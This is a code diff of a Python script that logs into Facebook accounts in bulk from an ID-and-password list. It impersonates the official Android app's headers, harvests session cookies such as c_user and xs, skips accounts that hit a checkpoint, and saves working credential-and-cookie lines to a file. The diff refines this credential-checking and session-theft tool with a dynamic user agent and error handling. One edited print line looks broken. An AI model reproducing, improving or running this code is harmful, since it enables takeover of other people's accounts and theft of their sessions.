@@ -37,12 +37,8 @@ def useragent():
 ua = ['FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi']
 
 
-
 def inc3_cookies(email, pwd):
-    # Use a specific static User-Agent for debugging
-    ugen = 'FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM={density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi'
-
-    # Prepare data for the login request
+    ugen = useragent()  # Use a dynamic User-Agent
     data = {
         "format": "json",
         "cpl": "true",
@@ -64,11 +60,9 @@ def inc3_cookies(email, pwd):
     }
 
     headers = {
-        'User-Agent': ugen,  # Use static User-Agent for debugging
+        'User-Agent': ugen,
         'Content-Type': 'application/x-www-form-urlencoded',
         'Host': 'graph.facebook.com',
-        #'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-        #'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
         'X-FB-Connection-Type': 'MOBILE.LTE',
         'X-Tigon-Is-Retry': 'False',
         'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
@@ -81,19 +75,19 @@ def inc3_cookies(email, pwd):
         'x-fb-connection-token': 'd29d67d37eca387482a8d7e786e38746f047a0cbebb64d5ecc412f5e0f1cb5'
     }
 
-    # Send login request
     req = requests.Session()
-    response = req.post(url, data=data, headers=headers).json()
+    response = req.post(url, data=data, headers=headers)
 
-    #print(response)
+    # Ensure response is valid JSON
+    try:
+        response_json = response.json()
+    except ValueError:
+        return None
 
-    # Check if session cookies are present in the response
-    if "session_cookies" in response:
-        cookies = {cookie['name']: cookie['value'] for cookie in response['session_cookies']}
-        #token = response.get("access_token", "")
-        # Check if c_user is present to verify successful login
-        c_user = cookies.get('c_user', '')
-        if not c_user:
+    if "session_cookies" in response_json:
+        cookies = {cookie['name']: cookie['value'] for cookie in response_json['session_cookies']}
+        uid = cookies.get('c_user', '')  # Save c_user value as uid
+        if not uid:
             return None
 
         # Extract specific cookies
@@ -103,15 +97,14 @@ def inc3_cookies(email, pwd):
         fr = cookies.get('fr', '')
 
         # Create the cookie string in the specified format
-        cookie = f"datr={datr}; sb={sb}; c_user={c_user}; xs={xs}; fr={fr}; m_page_voice={c_user}"
+        cookie = f"datr={datr}; sb={sb}; c_user={uid}; xs={xs}; fr={fr}; m_page_voice={uid}"
 
         # Handle checkpoint detection
         if 'checkpoint' in cookie:
             return None
-        else:
-            return cookie
-    else:
-        return None
+        return cookie
+    return None
+
 
 if __name__ == "__main__":
     # Ask for input and output file paths
@@ -138,8 +131,8 @@ if __name__ == "__main__":
             cookies = inc3_cookies(uid, password)
             if cookies:
                 # If token was successfully retrieved, print and log success
-                outfile.write(f"{c_user}|{password}|{cookies}\n")
-                print(f"{GREEN}{c_user}|{password}|{cookies}{RESET}")  # Print success in green
+                outfile.write(f"{uid}|{password}|{cookies}\n")
+                print(f"{uid}{c_user}|{password}|{cookies}{RESET}")  # Print success in green
             else:
                 # If login failed, print and log the failure
                 outfile.write(f"{uid}|{password}|login_failed\n")
